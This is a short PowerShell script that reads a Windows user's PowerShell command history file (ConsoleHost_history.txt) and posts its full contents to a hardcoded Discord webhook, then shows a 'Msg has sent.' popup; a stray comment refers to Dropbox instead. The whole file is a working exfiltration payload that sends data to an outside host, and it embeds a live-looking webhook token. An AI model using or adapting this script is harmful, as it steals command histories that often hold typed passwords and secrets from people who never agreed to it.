#Powershell-History

#Insert your webhook here
$webhookUri = 'https://discord.com/api/webhooks/1254904170561933312/7GpZApBg0nimAUc2nfK91OErdZIlDZUIR8hSypvWXyaS8tnKiOvrFMi1P-2sYe_SoAu6'

# See if file is a thing
Test-Path -Path "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -PathType Leaf

#If the file does not exist, write to host.
if (-not(Test-Path -Path "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -PathType Leaf)) {
     try {
		 #Creating the body of your message
			$Body = @{
		   'Subject' = 'Powershell History'
		   'content' = 'Powershell History not found!'
		   }
		#Send your data using REST method
			Invoke-RestMethod -Uri $webhookUri -Method 'post' -Body $Body
		}  
     catch {
         throw $_.Exception.Message
     }
 }
 # Copy Powershell History to Temp Directory to get sent to Dropbox
  else {
    $F1 = cat "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
		 
	#Creating the body of your message
		$Body = @{
	   "Subject" = "Powershell History"
	   "content" = $F1 | Out-String
	   }
	#Send your data using REST method
		Invoke-RestMethod -Uri $webhookUri -Method 'post' -Body $Body
	}  

	$done = New-Object -ComObject Wscript.Shell;$done.Popup("Msg has sent.",1)


